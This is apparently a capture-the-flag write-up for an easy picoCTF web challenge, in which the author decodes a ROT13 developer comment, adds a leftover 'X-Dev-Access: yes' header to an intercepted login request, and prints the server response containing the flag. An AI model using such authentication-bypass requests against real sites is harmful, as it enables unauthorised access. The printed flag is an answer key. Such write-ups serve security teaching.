picoCTF – Web Exploitation (Easy) Writeup
Challenge Overview

The challenge provides a login page. The goal is to bypass authentication and retrieve the flag.

1– Inspect the Page Source

I first inspected the HTML source code of the login page.

I found the following comment:

-- ABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf" --
-- Remove before pushing to production! --

This text looked encoded.

Step 2 – Decode the Message

The text was encoded using ROT13.

After decoding it, I got:

NOTE: Jack - temporary bypass: use header "X-Dev-Access: yes"

This indicates that the developer left a temporary authentication bypass using a custom HTTP header.

3– Intercept the Request with Burp Suite

Next, I opened Burp Suite and enabled the proxy interceptor to capture the login request.


4– Modify the Request

Inside Burp Suite, I modified the intercepted request by adding the following header:

X-Dev-Access: yes

Modified request:

POST /login HTTP/1.1
Host: amiable-citadel.picoctf.net
Content-Type: application/json
X-Dev-Access: yes

{"email":"ctf-player@picoctf.org","password":"evil"}

Then I forwarded the request to the server.
 
 5– Server Response

The server accepted the request and returned a successful response including the flag.

{
 "success": true,
 "email": "ctf-player@picoctf.org",
 "firstName": "pico",
 "lastName": "player",
 "flag": "picoCTF{brut4_f0rc4_1a386e6f}"
}
🚩 Flag
picoCTF{xxxxxxxxxxxxxxxxxxxxxx}
